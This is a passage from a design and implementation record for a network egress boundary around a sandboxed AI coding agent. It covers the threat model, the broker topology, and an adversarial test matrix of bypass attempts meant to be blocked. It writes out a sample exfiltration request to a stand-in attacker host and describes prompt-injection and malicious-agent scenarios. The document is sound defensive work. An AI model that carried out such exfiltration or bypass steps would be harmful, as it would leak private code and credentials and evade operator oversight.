# R5 — Developer-Hermes egress policy

**Slice:** `R5_EGRESS_POLICY_GATE`
**Date:** 2026-08-24
**Depends on:** `R5_CONTAINER_BOUNDARY_XS = PASS`, `R5_DEVELOPER_DX_XS = PASS`,
`R5_SECURITY_DELTA_REATTACK = PASS_WITH_FINDINGS`, `R5_RUNTIME_CONVERGENCE_XS = PASS`
**Status:** `R5_EGRESS_POLICY_GATE = PASS` (design) →
`R5_EGRESS_POLICY_SMALL = PASS` (implemented and enforced)
**Decides:** F06, now closed in both senses. The decision was made here; the
runtime constant `R5_F06_STATUS` is `ENFORCED_EGRESS_POLICY` and the running
container reaches only approved destinations.

```text
R5_CONFIDENTIALITY_CONTRACT      = HOST_AND_PRODUCTION_ISOLATION
                                   + PRIVATE_REPO_CONFIDENTIALITY_AGAINST_
                                     ARBITRARY_THIRD_PARTIES
SELECTED_EGRESS_ARCHITECTURE     = ENFORCING_BROKER_ON_INTERNAL_DOCKER_NETWORK
UNRESTRICTED_RAW_EGRESS          = DENIED
EGRESS_HERMES_CORE_CHANGES_REQUIRED = 0
DOCKER_AUTHORITY_REMAINS_ABSENT  = YES
IMPLEMENTATION_MAGNITUDE         = SMALL
```

Sections 1–17 are the decision and its reasoning, written before anything was
built. **Section 18 is the implemented state** — what exists, what was
measured, and the two places where reality corrected the design.

This document is the reusable architectural truth for Developer-Hermes
outbound networking. A future agent must not need the originating chat
transcript. Machine-specific measurements stay in `.r5-dev/artifacts/`
(gitignored); the findings that changed the architecture are recorded here.

---

## 1. What R5 promises

R5 previously proved host isolation and production-authority isolation. It
never stated a confidentiality promise for the content the sandbox is
allowed to read. That gap was finding F06. It is now closed explicitly.

| Concern | R5 promise | Boundary that carries it |
|---|---|---|
| **A. Host isolation** | `MUST_PROTECT` | Container + literal two-repository bind allowlist |
| **B. Production authority isolation** | `MUST_PROTECT` | Credential absence; no Railway/Vercel/DB/Docker authority in the sandbox |
| **C. Private Repo B confidentiality** | `MUST_PROTECT` against arbitrary third-party destinations; `BEST_EFFORT` against approved processors | Egress topology + destination policy (this document) |
| **D. Developer model-credential confidentiality** | `MUST_PROTECT` against exfiltration off-box; `OUT_OF_SCOPE` against in-sandbox read | Egress topology; the key is readable in-process by design |
| **E. Persistent `HERMES_HOME` state confidentiality** | Same class as C — `MUST_PROTECT` against arbitrary destinations | Egress topology; `-Mode reset` for recovery |

Two of these need their limits spelled out, because a promise that
overstates itself is worse than no promise.

**C is not perfect DLP.** Any content the sandbox may read can be sent to a
destination the policy allows. The promise is that the *set of possible
recipients* is a short, named, human-approved list — not the Internet. An
adversary who wants Repo B out cannot pick their own collection endpoint.

**D distinguishes secret confidentiality from secret usability.** Malicious
code inside the sandbox can always read `OPENAI_API_KEY`, because Hermes
needs it in-process. What the egress policy changes is whether the key can
be *carried out* to a third party. It can still be *used* against the
allowed model endpoint from inside the sandbox, so quota burn remains a
real cost risk and is mitigated commercially, not by networking.

---

## 2. Approved external processors vs arbitrary destinations

Not all outbound traffic is equivalent, and treating it as equivalent
produces either a useless agent or a false sense of safety.

An **approved external processor** is a named service that Developer Hermes
is *intended* to send task content to, under a human decision, so that it
can do its job. A cloud model provider is the obvious case: inference
requires transmitting code and context. That is a data-processing
relationship, not exfiltration.

An **arbitrary external destination** is any host nobody approved. Sending
Repo B there is exfiltration regardless of which process did it or why.

The policy therefore classifies destinations, not packets:

| Class | Examples | Content sent | Default |
|---|---|---|---|
| `MODEL_PROVIDER` | configured inference endpoint(s) | Task context and source by design | ALLOW — approved processor |
| `RESEARCH_PROCESSOR` | Hermes web-search/fetch provider API | Query strings and target URLs | ALLOW — approved processor, bounded |
| `SOURCE_CONTROL_READ` | GitHub HTTPS read/fetch endpoints | Requests only; sandbox holds no GitHub credential | ALLOW |
| `LANGUAGE_PACKAGE_REGISTRY` | PyPI + its file CDN, npm registry | Requests only; sandbox holds no publish credential | ALLOW |
| `OS_PACKAGE_REGISTRY` | Debian archive + security mirrors | Requests only | ALLOW |
| `SUPPLY_CHAIN_SAFETY` | vulnerability/malware lookup used before running fetched packages | Package names | ALLOW |
| `RUNTIME_ARTIFACT` | pinned runtime/toolchain downloads | Requests only | ALLOW on demand |
| `OTHER_ARBITRARY_NETWORK` | everything else, including raw TCP, SSH, arbitrary DNS resolvers | — | **DENY, fail closed** |

The distinction survives the obvious objection: an approved processor is
still a place data goes. The point is that it is a *decided* place, with an
operator, a contract, and a name in a policy file that a human can read.

---

## 3. Network classes actually needed

Measured on the running Developer-Hermes container plus a static inventory
of Hermes core network call sites.

```text
REQUIRED_NETWORK_CLASSES =
  MODEL_PROVIDER
  LANGUAGE_PACKAGE_REGISTRY   (PyPI + file CDN, npm registry)
  OS_PACKAGE_REGISTRY         (Debian archive + security)
  SOURCE_CONTROL_READ         (GitHub HTTPS fetch/clone/API read)
  DNS                         (resolved by the broker, not by the sandbox)

OPTIONAL_NETWORK_CLASSES =
  RESEARCH_PROCESSOR          (web search / page retrieval provider API)
  SUPPLY_CHAIN_SAFETY         (vulnerability lookup before running fetched code)
  MODEL_METADATA              (model catalogue / provider capability discovery)
  RUNTIME_ARTIFACT            (pinned toolchain downloads, rare)

UNNECESSARY_NETWORK_CLASSES =
  OUTBOUND_SSH                (no remote push authority exists by design)
  ARBITRARY_DIRECT_WEB        (superseded by RESEARCH_PROCESSOR)
  ARBITRARY_RAW_TCP_UDP
  ARBITRARY_EXTERNAL_DNS_RESOLVERS
  HOST_GATEWAY / HOST_LAN
  INBOUND_ANYTHING            (no published ports today)
  TELEMETRY                   (no third-party telemetry in Hermes core)
```

Upstream `hermes update` (git pull + package install) is deliberately *not*
a required class: Developer Hermes runs pinned pure upstream from
`/opt/hermes`, and updates happen by rebuilding the image from a new pinned
digest, on the host, through the canonical launcher.

---

## 4. Threat model under the current unrestricted egress

The container today runs on the default bridge with every proxy variable
unset. `webhook.site`, `pastebin.com`, arbitrary IP literals and
`github.com:22` are all reachable. Maximum damage is assessed against the
authority the sandbox legitimately holds: Repo A + Repo B read/write, the
Developer model key, and persistent `HERMES_HOME`.

| # | Scenario | Max damage today | Changed by this policy |
|---|---|---|---|
| 1 | Normal well-behaved Hermes | Intended traffic only | No behavioural change |
| 2 | Strong model makes a mistake | Accidental request to an unintended host; low volume | Denied and logged |
| 3 | Weak model makes a mistake | Same, more often; may paste content into a random API while "testing" | Denied and logged |
| 4 | Prompt injection from repository content | Full Repo A+B copy, model key and `HERMES_HOME` to an attacker endpoint | Attacker endpoint unreachable |
| 5 | Prompt injection from public web content | Same as 4, and the injected instruction usually names the collection URL | Named URL unreachable |
| 6 | Malicious dependency / lifecycle script | Arbitrary code at install time with full sandbox authority and full egress | Code still runs; its collection endpoint is unreachable |
| 7 | Poisoned Skill / `HERMES_HOME` | Persistent, survives container removal; exfiltrates on every session | Persistence unchanged; exfiltration path removed. Recovery is `-Mode reset` |
| 8 | Deliberately malicious agent behaviour | Complete loss of Repo B confidentiality | Reduced to approved-processor channels only |
| 9 | Compromised upstream package | Same as 6, with better disguise | Same as 6 |

```text
MODEL_STRENGTH_SECURITY_DEPENDENCE = HIGH  (today)
                                   → LOW   (after this policy)
```

Today the only thing standing between scenarios 4–9 and a full Repo B
disclosure is that the code running in the sandbox chooses not to do it.
That is a behavioural expectation, not a boundary, and cases 6, 7 and 9 are
not model behaviour at all — a lifecycle script runs whatever the package
author wrote, regardless of how good the model is. A boundary that only
holds for well-aligned strong models does not hold.

After this policy, the reachable-destination set is decided by
infrastructure the sandbox cannot reconfigure, so it holds identically for a
frontier model, a cheap model, and hostile code with no model at all.

---

## 5. Options evaluated

Scores are 1–10, higher is better. "Operational simplicity" is stated as a
benefit so that every column points the same way (10 = simplest to run).

| Option | Security | Dev capability | Repo confidentiality | Maintainability | Update elegance | Operational simplicity | Performance |
|---|---|---|---|---|---|---|---|
| **A** Unrestricted (current) | 3 | 10 | 1 | 10 | 10 | 10 | 10 |
| **B** Logging proxy only | 4 | 10 | 2 | 7 | 9 | 7 | 9 |
| **C** Enforcing proxy + destination policy | 8 | 8 | 8 | 7 | 9 | 6 | 9 |
| **D** Static domain allowlist (rigid) | 8 | 5 | 8 | 4 | 8 | 6 | 9 |
| **E** Network off by default + human open | 10 | 2 | 9 | 8 | 9 | 5 | 6 |
| **F** Multi-profile private/research split | 7 | 7 | 5 | 4 | 7 | 3 | 8 |
| **G** Hybrid (**selected**) | 9 | 9 | 8 | 7 | 9 | 6 | 9 |

**Leading candidates were C, E and G.**

**A** is disqualified on confidentiality alone. It scores perfectly on
everything except the one property this gate exists to establish.

**B** is the seductive wrong answer. Observability is not a boundary: a
proxy that records an exfiltration and forwards it has exfiltrated. B earns
a 2 rather than a 1 only because detection shortens the recovery window.

**D** fails on maintainability rather than security. A frozen list of exact
domains breaks the first time a package moves to a new CDN, and every break
lands on the developer mid-task. Its security is identical to C, so the
rigidity buys nothing.

**E** has the best security number and the worst outcome. Constant human
gating destroys the "no micro-approvals" property that R5 was built for,
and an approval prompt that fires twenty times an hour gets approved
reflexively — which converts a strong boundary into a weak one via human
factors. It survives as a *mode*, not as the default.

**F** looks attractive and dissolves on contact with persistent state. A
research profile is only meaningful if it cannot read Repo B, and the moment
it shares `HERMES_HOME` it reads Repo B indirectly through sessions,
memories and Skills. Giving it a separate home costs the developer their
accumulated context exactly when they switch to research — which is
mid-task, constantly. Two homes, two configs, two credential scopes and a
switching ritual, in exchange for a confidentiality gain that the shared
state quietly cancels.

**G** is C plus three specific decisions that fix C's weaknesses: allowlist
by destination *class* with a documented one-file review path (fixes D's
brittleness), route public web research through an approved retrieval
provider instead of direct browsing (recovers the capability C would lose),
and keep an explicit offline mode for running untrusted code (recovers E's
strength where it is cheap).

---

## 6. Selected architecture

```text
SELECTED_EGRESS_ARCHITECTURE = G_HYBRID
  enforcing destination-policy broker
  on an internal Docker network
  + provider-mediated public web research
  + explicit offline mode
```

```
┌──────────────────────────────────────────────────────────┐
│ Docker network  r5-dev-internal   (internal: true)       │
│   no default route · no external DNS · no host gateway   │
│                                                          │
│   ┌───────────────────────┐        ┌──────────────────┐  │
│   │ r5-developer-hermes   │───────►│ r5-egress-broker │  │
│   │ Repo A RW, Repo B RW  │  3128  │  destination     │  │
│   │ model key, HERMES_HOME│        │  policy + audit  │  │
│   └───────────────────────┘        └────────┬─────────┘  │
└─────────────────────────────────────────────┼────────────┘
                                              │
┌─────────────────────────────────────────────┼────────────┐
│ Docker network  r5-dev-egress (bridge)      ▼            │
│                                   allowlisted classes    │
│                                   everything else: DENY  │
└──────────────────────────────────────────────────────────┘
```

The Developer container attaches to the internal network **only**. The
broker is dual-homed. That single topological fact is the boundary; the
`HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` variables injected into the
container are convenience routing so ordinary tools work, not a control.

### Why the topology and not the proxy variables

Measured on this host, from a container attached only to an internal
network:

- Every external name fails to resolve. Docker Desktop's embedded resolver
  does not forward for internal-only networks. This is **stronger** than the
  limitation stated in upstream `docs/security/network-egress-isolation.md`,
  which assumes external DNS still resolves.
- Raw UDP to `1.1.1.1:53` and `8.8.8.8:53` fails — no DNS tunnel.
- Connecting to a bare IP literal fails — no hostname bypass.
- `host.docker.internal`, `gateway.docker.internal`, the Docker Desktop
  resolver, the host gateway and the default bridge are all unreachable —
  no host pivot and no lateral movement to other containers.
- Deleting `HTTP_PROXY` and `HTTPS_PROXY` does **not** restore egress; curl
  then fails with "Could not resolve host". The bypass that would defeat an
  env-var-only design fails closed here.

Through the broker, with a destination policy in place, `curl`, `uv pip`,
`npm` and `git` over HTTPS all work for allowlisted hosts and receive a
clean `403` for everything else.

### Consequences the developer will actually notice

- Outbound SSH is gone. Git over SSH cannot work. This costs nothing today
  because the sandbox holds no SSH key and no push authority.
- Direct browsing to an arbitrary URL from inside the sandbox is gone.
  Research goes through the retrieval provider instead (§7).
- A genuinely new destination produces an immediate, readable denial rather
  than a silent hang, and adding it is a one-line policy edit plus a broker
  restart.

### Implementation boundaries for the next slice

Allowed: launcher and Docker network topology, a broker container built
from a pinned image, a checked-in policy file, injected proxy environment
variables, audit configuration, tests.

Forbidden: any change under Hermes core, Docker socket exposure, privileged
mode, host network namespace, host firewall or ACL changes, published
inbound ports, production access.

The broker must forward plain HTTP for allowlisted hosts as well as
tunnelling `CONNECT`, because `apt` uses plain HTTP. A `CONNECT`-only broker
silently breaks `apt-get update` — measured, not assumed.

---

## 7. Public web research

Arbitrary direct web access and meaningful Repo B confidentiality cannot
coexist. `GET https://attacker.example/?d=<repo>` is a complete
exfiltration channel, and any allowlist that includes "the web" includes
that. There is no path-, method-, or header-level restriction that survives
a deliberate adversary, because the adversary controls the URL, the query
string, the body, and can fall back to DNS names, WebSockets or raw TCP if
the HTTP surface is narrowed.

The resolution is to change who does the fetching. Hermes already ships
server-side retrieval tools whose providers fetch the page and return its
content. The sandbox then talks to exactly one named API instead of to the
open Internet.

```text
PUBLIC_WEB_RESEARCH_POLICY = PROVIDER_MEDIATED_RETRIEVAL
```

Documentation lookup, technical research, package documentation, and
upstream issue/release research all continue to work. GitHub HTTPS read
remains directly allowed, so release notes, issues and source stay
first-class.

The honest residual: the query string and the requested URL are attacker-
controllable, so a low-bandwidth channel to the retrieval provider exists.
It is bounded, it is logged, and it terminates at a named processor rather
than at an endpoint the attacker chose. That is a real reduction, not a
perfect one, and this document does not claim otherwise.

---

## 8. Prevention, detection, containment, recovery

Conflating these is how observability gets mistaken for a boundary.

**Prevention.** The internal network prevents reaching any destination the
broker does not allow, including by IP literal, alternate DNS, SSH and raw
TCP. It does **not** prevent sending sensitive content to an allowed
destination, and it does not prevent the model provider from receiving the
code it needs for inference. Those are accepted, named channels.

**Detection.** The broker's audit record shows which destinations were
attempted and which were denied. A burst of denials is a strong
prompt-injection signal. Detection covers nothing about content.

**Containment.** A compromised sandbox stays confined to the two repository
mounts, its own `HERMES_HOME`, and the allowed destination set. It cannot
pivot to the host, to other containers, or to production.

**Recovery.** Persistent poisoning is removed with the existing
`launch-developer-hermes.ps1 -Mode reset`, which deletes only the
`r5-developer-hermes-home` volume. A suspected model-key exposure is
resolved by rotating the dedicated key, which is why the key is dedicated
and restricted in the first place. Repository damage is recovered through
Git, and the dedicated clones are never executed on the host.

---

## 9. Per-area policy

```text
MODEL_PROVIDER_EGRESS_POLICY =
  Explicit trusted class. Multiple providers may be configured, each one an
  explicit policy entry. Adding OpenRouter or any other provider is a
  deliberate policy change (one allowlist line + review), never an
  automatic consequence of setting a key. Model routing stays
  configuration-only and needs no core change; a route to an unlisted
  provider fails closed at the broker with a readable denial.

PACKAGE_EGRESS_POLICY =
  Allow the registry classes, not a frozen host list: PyPI and its file
  CDN, the npm registry, Debian archive and security mirrors, GitHub
  release assets. Package managers stay enabled — the objective is the
  destination set, not the tool. Arbitrary Git dependencies pointing at
  non-GitHub hosts will be denied; that is the intended trade, with a
  documented review path when a real need appears.

GIT_EGRESS_POLICY =
  HTTPS read/fetch/clone against allowlisted source-control hosts. No SSH.
  No push authority (unchanged from the existing contract). Local commits
  are unaffected because they never touch the network.

DNS_POLICY =
  The sandbox performs no external name resolution at all. Docker's
  embedded resolver serves only the broker's service name. All external
  resolution happens broker-side as part of the allow decision, which is
  what closes the DNS-tunnel channel.

HERMES_HOME_EGRESS_TRUST_MODEL =
  SINGLE_TRUST_DOMAIN_SHARED_HOME.
  Repo A, Repo B and HERMES_HOME are one confidentiality domain under one
  egress policy. Persistent state is treated as containing private context,
  because sessions, memories and Skills demonstrably do. No profile may
  claim a weaker egress posture while sharing this home; a genuinely
  lower-trust posture would require a separate home, and the shared-home
  leak is precisely why the multi-profile option was rejected.

MULTI_PROFILE_NETWORK_POLICY = NOT_RECOMMENDED
  One enforced policy, plus an explicit offline switch (`--network none`)
  for running untrusted code or dependency installs under review. That is a
  topology switch, not a second confidentiality posture, so it cannot drift
  from the first.

SELECTED_NETWORK_PROFILE_MODEL = SINGLE_ENFORCED_PROFILE_PLUS_OFFLINE_SWITCH
```

---

## 10. Model-key blast radius

Restricting egress materially reduces key **theft** and does nothing about
in-sandbox **use**. Both statements matter.

Theft requires carrying the secret to somewhere the attacker can read it.
Under this policy the reachable set contains no attacker-controlled
endpoint, so the practical exfiltration paths reduce to the bounded
retrieval-query channel and to encoding the key into requests aimed at an
allowed host whose operator would have to be complicit.

Use does not require exfiltration at all. Malicious code can spend the key
against the allowed model endpoint from inside the sandbox. Networking
cannot fix that; the mitigations are commercial and are already partly in
place: a dedicated restricted key, restricted project permissions, a model
allowlist, a project spend limit, and rotation.

```text
MODEL_KEY_RESIDUAL_RISK =
  LOW for third-party theft
  MEDIUM for in-sandbox quota abuse (bounded by project spend limit)
MODEL_KEY_EGRESS_REQUIREMENT =
  The key must reach configured model-provider endpoints only. No other
  destination class needs it, and no other destination class should be able
  to receive a request carrying it.
```

---

## 11. Failure behaviour

```text
FAILURE_MODE_POLICY = FAIL_CLOSED_WITH_LEGIBLE_DIAGNOSTICS
```

| Condition | Behaviour |
|---|---|
| Broker unavailable | No egress at all — topology, not policy. Launcher preflight reports the broker as down before the developer starts working |
| Policy file missing or malformed | Broker refuses to start. Never falls back to allow-all |
| DNS fails at the broker | That single request fails; the boundary is unaffected |
| Approved model provider unreachable | Normal upstream outage; the error surfaces as a provider error, not as a policy error |
| New package registry encountered | Explicit denial, named in the audit record, with the destination visible so the human can decide |
| Unknown domain requested | Explicit denial, logged, immediate readable error to the developer |
| Configuration malformed | Fail closed at launch with a specific message |

Fail-closed must not mean opaque. Every denial names the destination that
was refused, so routine troubleshooting is a matter of reading one line
rather than bisecting the network.

---

## 12. Audit

```text
EGRESS_AUDIT_POLICY = METADATA_ONLY_DESTINATION_LEDGER
```

Recorded per outbound attempt: timestamp, destination host, port, protocol,
policy class, allow/deny decision, and — where the broker can attribute it —
a coarse client identifier.

Never recorded: API keys, `Authorization` or other credential headers,
request or response bodies, source code, prompts, repository contents, URL
query strings.

Retention is proportionate: a size-capped rolling log in a dedicated Docker
volume, not in either repository and not in `HERMES_HOME`. The audit trail
is a detection aid and an operational debugging aid. It is explicitly **not**
a confidentiality control.

---

## 13. Adversarial test matrix for the implementation slice

`EGRESS_ADVERSARIAL_TEST_MATRIX` — every row must fail closed, be executed
non-destructively, and be automated in `tests/r5_developer_hermes/`.

| # | Attempt | Required result |
|---|---|---|
| 1 | Raw TCP to an arbitrary external host/port | DENY |
| 2 | Raw TCP to a bare IP literal, no hostname | DENY |
| 3 | IPv6 literal and IPv6-only destination | DENY |
| 4 | `curl` to a non-allowlisted host | DENY |
| 5 | `curl` after unsetting `HTTP_PROXY`/`HTTPS_PROXY` | DENY (topology holds) |
| 6 | `curl` with `NO_PROXY=*` set by the attacker | DENY |
| 7 | Python `requests` / `httpx` direct to arbitrary host | DENY |
| 8 | Node global `fetch` to arbitrary host | DENY |
| 9 | `npm install` from a non-allowlisted registry or tarball URL | DENY |
| 10 | `uv` / `pip` with `--index-url` pointing at an arbitrary host | DENY |
| 11 | `git clone` / `ls-remote` against a non-allowlisted host | DENY |
| 12 | `git` over SSH to any host | DENY |
| 13 | `ssh` to any host | DENY |
| 14 | DNS query to an external resolver (UDP and TCP) | DENY |
| 15 | Custom `/etc/resolv.conf` written inside the container | DENY |
| 16 | HTTP redirect from an allowed host to a denied host | DENY at the broker |
| 17 | WebSocket upgrade to a denied host | DENY |
| 18 | `CONNECT` to an allowed host on a non-standard port | DENY |
| 19 | Reaching the host gateway or `host.docker.internal` | DENY |
| 20 | Reaching another container on the default bridge | DENY |
| 21 | Malicious Skill in `HERMES_HOME` attempting egress | DENY |
| 22 | Malicious Git hook attempting egress | DENY |
| 23 | Package lifecycle script attempting egress | DENY |
| 24 | Behaviour after container restart | DENY still enforced |
| 25 | Behaviour after broker restart / while broker is down | DENY (no fallback) |
| 26 | Allowlisted model provider, registries, GitHub HTTPS | ALLOW — positive controls |
| 27 | `apt-get update` through the broker | ALLOW — plain-HTTP forwarding regression |
| 28 | Docker socket / daemon reachable from the sandbox | ABSENT |

Rows 26 and 27 are as important as the denials: a suite that only proves
things are blocked will happily pass on a completely broken sandbox.

---

## 14. Upstream update implications

```text
EGRESS_HERMES_CORE_CHANGES_REQUIRED = 0
UPSTREAM_UPDATE_ELEGANCE_IMPACT     = LOW
```

Everything lives in R5 container infrastructure: the launcher, two Docker
networks, a broker container, a policy file, and injected environment
variables. Hermes core is not patched, so the pinned-digest rebuild path,
the image-input fingerprint, the identity labels and the runtime-convergence
proof all keep working unchanged.

Hermes core already cooperates. The primary OpenAI and auxiliary client
paths resolve proxies explicitly from the environment and honour `NO_PROXY`
(`agent/process_bootstrap.py`, `agent/agent_runtime_helpers.py`), and
upstream already documents an egress-isolated Docker deployment in
`docs/security/network-egress-isolation.md`. This design is a stricter
instance of a pattern upstream already supports, which is why it survives
updates.

```text
UPSTREAM_UPDATE_EGRESS_CHECKS =
  1. Diff upstream for new outbound destinations, especially new default
     provider or catalogue endpoints.
  2. Re-verify that the primary and auxiliary model clients still resolve
     proxies from the environment and were not switched to trust_env=False
     or to a bypassing transport.
  3. Check for new package-management behaviour executed at runtime.
  4. Check for new gateway or networking assumptions, including any newly
     required inbound port.
  5. Run class-proportionate egress evidence against the rebuilt image.
     ROUTINE does not replay the full §13 matrix. MATERIAL re-runs only
     the affected rows. TRUST_BOUNDARY_CHANGE proves the new path.
  6. Confirm no new raw-socket or WebSocket path bypasses the broker.
  7. Confirm the allowlist still covers everything the smoke test needs;
     a new required destination is a policy decision, not a silent addition.
```

Canonical classes, workflow, and cost policy:
[`hermes_r5_developer_dx_v1.md`](./hermes_r5_developer_dx_v1.md)
§ Upstream update contract. Do not reopen `R5_GATE` for ordinary
maintenance.

Two known interactions to carry forward. MCP stdio servers receive a
filtered environment (`tools/mcp_tool.py`, `_SAFE_ENV_KEYS`) that excludes
proxy and CA variables, so a networked stdio MCP server fails closed until
its proxy environment is declared in its own server config. Node's global
`fetch` ignores `HTTP_PROXY` entirely, so Node code that must reach the
network needs an explicit proxy agent; it fails closed rather than leaking.

---

## 15. Desktop, Bot Mode, rollback

```text
DESKTOP_EGRESS_COMPATIBILITY  = MANAGEABLE
BOT_MODE_EGRESS_COMPATIBILITY = GOOD
```

**Desktop.** The egress design requires nothing from Desktop and grants it
nothing: no host execution authority, no Docker daemon authority beyond
what a host application controlling a container runtime inherently has, no
broad networking authority. One measured constraint must be carried
forward: a container attached only to an internal network **cannot publish a
host port** — `docker run -p` starts, but no host binding is created and the
host cannot connect. A future Desktop that talks to a gateway inside the
container therefore needs either `docker exec` or a dual-homed transport
sidecar. That is a solvable design task, which is why this is `MANAGEABLE`
rather than `GOOD`, and it is better discovered now than during Desktop
remediation.

That shape is now implemented as inbound UI transport only. The Developer
container still has no published host port.

```text
DESKTOP_TRANSPORT =
  Desktop -> localhost-only authenticated transport sidecar
          -> internal Docker network -> Developer Hermes gateway
  host exposure bound to 127.0.0.1:19119 only
  authentication / pairing mandatory
  no local-host tool-execution fallback
  workspace resolver stays /workspace/*
PORT_9119_OPENED_ON_DEVELOPER_CONTAINER = NO
HOST_SIDECAR_PUBLISH = 127.0.0.1:19119
```

The sidecar is the dual-homed party, exactly as the broker is. Desktop must
not be solved by attaching the Developer container to a routable network —
that would trade the confidentiality boundary for a convenience.

**Bot Mode.** Outbound polling with no public inbound port fits this
architecture directly: add the platform API to the allowlist and nothing
else changes. Bot Mode also *strengthens* the case for the policy, because
it feeds untrusted third-party message content into the agent continuously
and unattended. That is scenario 5 from §4 running on a schedule with no
human watching the denials.

```text
BOT_MODE_EGRESS_REQUIREMENTS =
  platform API endpoints as an explicit allowlist class;
  no inbound port; outbound polling only;
  unattended operation makes the audit ledger and a denial-rate alert
  more valuable than in interactive use.
```

**Rollback.** The change is topological and reverses cleanly: recreate the
Developer container on the default bridge and remove the broker and the two
networks. No image rebuild, no Hermes core revert, no host state to undo.
The rollback path must itself be tested and must be an explicit, visible
action — never an automatic fallback when the broker is unhealthy, which
would convert the boundary into a suggestion.

---

## 16. Open questions

Questions 1–3 were answered by the implementation; see §18.4 (research
processor), §18.1 (broker choice) and §18.2 (TLS interception, where the
answer below was reversed). Questions 4 and 5 remain open.

1. Which retrieval provider becomes the approved `RESEARCH_PROCESSOR`, and
   under which credential? Provider selection is a separate decision from
   this architecture.
2. Broker implementation choice (Squid with an allowlist config versus a
   small purpose-built broker). Squid is the lower-maintenance default;
   the requirement is plain-HTTP forwarding plus `CONNECT` tunnelling plus
   metadata-only logging.
3. Whether TLS interception is ever wanted. Current answer: **no**. It adds
   certificate distribution complexity across Python, Node, Git, apt and
   uv, it breaks pinning, and it buys content inspection this design
   deliberately does not promise.
4. Denial-rate alerting thresholds, particularly once Bot Mode exists.
5. Whether the offline mode should become the default for dependency
   installation of unreviewed packages.

---

## 17. Consistency with established R5 truths

Unchanged by this decision, and re-confirmed:

```text
DEVELOPER_HERMES_CONTROLLER      = PINNED_PURE_UPSTREAM
DEVELOPER_RUNTIME_SOURCE         = /opt/hermes
CONTAINER_MOUNT_BOUNDARY         = PRIMARY HOST BOUNDARY
REPO_A_REPO_B_SAME_TRUST_DOMAIN  = YES
DEDICATED_CONTAINER_CLONES       = DO_NOT_EXECUTE_ON_HOST
RESET_DEVELOPER_HERMES_HOME      = launch-developer-hermes.ps1 -Mode reset
RUNTIME_CONVERGENCE              = MANDATORY
MODEL_CREDENTIAL                 = DEDICATED_ALLOWLISTED_FILE
DOCKER_AUTHORITY_REMAINS_ABSENT  = YES
PRODUCTION_AUTHORITY             = ABSENT
CANONICAL_KNOWLEDGE_RETENTION    = PASS
```

The container mount allowlist remains the primary host boundary. This
document adds a second boundary of a different kind: the mount allowlist
decides what the sandbox may *read*, and the egress policy decides where
what it read may *go*.

---

## 18. Implemented state (`R5_EGRESS_POLICY_SMALL`)

Everything below was measured against the running system, not derived from
the design. Machine-specific values live in `.r5-dev/artifacts/` (gitignored).

### 18.1 What is actually enforcing the boundary

The security boundary is the Docker topology. `r5-dev-internal` is created
`internal: true`, so it has no default route and no gateway to anywhere. The
Developer container attaches to that network and nothing else. The broker is
the only dual-homed container, holding a second interface on `r5-dev-egress`.

This is why deleting `HTTP_PROXY` inside the sandbox changes nothing: the
proxy variables are convenience routing for well-behaved clients, and
removing them leaves the process on a network with no way out at all. It is
also why Node's global `fetch` — which ignores proxy variables entirely — is
denied without any special handling.

```text
UPSTREAM_EGRESS_COMPONENT   = iron-proxy 0.39.0 (agent/proxy_sources/iron_proxy.py)
PINNED_HERMES_NATIVE_EGRESS_SUPPORT = FULL
EGRESS_HERMES_CORE_FILES_CHANGED    = 0
CUSTOM_EGRESS_CODE_MAGNITUDE        = SMALL
```

The broker is upstream's own egress component. The pinned Hermes image ships
`iron-proxy` with destination allowlisting, an SSRF CIDR guard and
proxy-token substitution already implemented, and `hermes egress` as its
official CLI. R5 supplies the policy, the topology and the launcher wiring;
it does not reimplement a proxy, and it patches nothing in Hermes core.

### 18.2 Where reality corrected the design

Two design assumptions did not survive measurement. Both are recorded because
the reasoning matters more than the outcome.

**TLS interception was ruled out in §16.3 and is in fact used.** Reusing
upstream's component means accepting how it works: credential substitution
requires seeing the request, which requires terminating TLS. The predicted
cost — distributing a CA across Python, Node, Git, apt and uv — turned out to
be a solved problem in the pinned image, which already honors `SSL_CERT_FILE`,
`NODE_EXTRA_CA_CERTS`, `GIT_SSL_CAINFO` and friends. The CA certificate
reaches the sandbox through a read-only Docker volume; the signing key never
leaves the broker. Content inspection is still not promised: the audit log
stays metadata-only.

**Upstream's `require` flag on the secrets transform had to be overridden.**
On iron-proxy 0.39 the transform also evaluates the `CONNECT` request, which
by construction carries no `Authorization` header, so `require: true` rejected
every HTTPS model call before the inner request existed. Measured, not
assumed: `rejected_by=secrets` on `CONNECT api.openai.com:443`. The override
lives in the broker entrypoint, which is the external wrap this calls for —
patching Hermes core would have been the wrong fix for a config default. The
cost is narrow: a provider key obtained some other way could be spent against
an already-approved provider host, which is quota abuse the architecture never
claimed to prevent, and the sandbox holds no such key.

### 18.3 Credential mediation

```text
MODEL_CREDENTIAL_LOCATION              = BROKER_ONLY
REAL_PROVIDER_KEY_READABLE_BY_DEVELOPER = NO
```

This is stronger than §1's promise D, which conceded that in-sandbox code can
always read the model key. It no longer can. The sandbox receives an opaque
token under the provider's environment-variable name; the broker swaps it for
the real credential, and only on the hosts of the class that credential
belongs to. The proven signal is the adversarial suite's positive control: the
sandbox sends its token to the provider and gets `200`, which is only possible
if the substitution fired.

The token is worth nothing off-box. It is meaningful to this broker alone, and
the broker will not forward it anywhere.

### 18.4 Public web research, as implemented

The pinned runtime does **not** have `ddgs` installed, so upstream's
DuckDuckGo provider reports unavailable and never runs. The real research path
is upstream's keyless MCP tier (`plugins/web/keyless_mcp.py`), which walks a
five-vendor ring: `exa`, `parallel`, `tavily`, `firecrawl`, `keenable`.

Two of those five are approved processors. The other three are deliberately
denied: two named parties already cover free-tier throttling, and every extra
vendor is another party receiving our queries.

The ring has a trap worth understanding. With no vendor pinned, upstream
starts at a per-session random cursor, and a connection the broker refuses is
not a throttle — so upstream's failover *stops* rather than advancing. An
unpinned sandbox would therefore lose research on most sessions purely by
where the cursor landed. The launcher pins the entry vendor to an approved
processor. That pin is routing, not security: pinning a denied vendor would
simply fail closed, and the broker still decides what may leave.

Measured during the real Hermes smoke, which is the most convincing evidence
in this document: the agent researched a public question, **tried to fetch
`docs.python.org` directly, was refused with 403 `rejected_by=allowlist`**,
and still produced the correct answer with its source URL — because the
approved processor did the retrieval. Approving a processor does not approve
the sites it reads.

### 18.5 Convergence

Egress inputs are part of the runtime convergence contract. The contract
fingerprint covers the policy, the broker contract, the broker Dockerfile, the
broker entrypoint and the launcher-side egress module — everything that
materially changes where data may go. Runtime audit logs are excluded on
